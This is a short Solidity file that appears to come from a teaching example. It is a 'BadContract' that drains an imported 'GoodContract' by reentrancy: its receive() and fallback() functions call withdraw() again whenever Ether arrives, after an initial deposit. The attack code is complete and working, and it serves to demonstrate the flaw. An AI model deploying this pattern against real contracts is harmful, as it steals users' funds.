// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./GoodContract.sol";

contract BadContract {
    GoodContract public goodContract;

    constructor(address _goodContractAddress) {
        goodContract = GoodContract(_goodContractAddress);
    }

    // we can use both, receive or fallback. Difference:
    // receive() external payable — for empty calldata (and any value)
    // fallback() external payable — when no other function matches (not even the receive function). Optionally payable.

    // Function to receive Ether
    receive() external payable {
        if (address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }

    // executed when no other function matches - not even receive()
    fallback() external payable {
        if (address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }

    // Starts the attack
    function attack() public payable {
        goodContract.addBalance{value: msg.value}();
        goodContract.withdraw();
    }
}
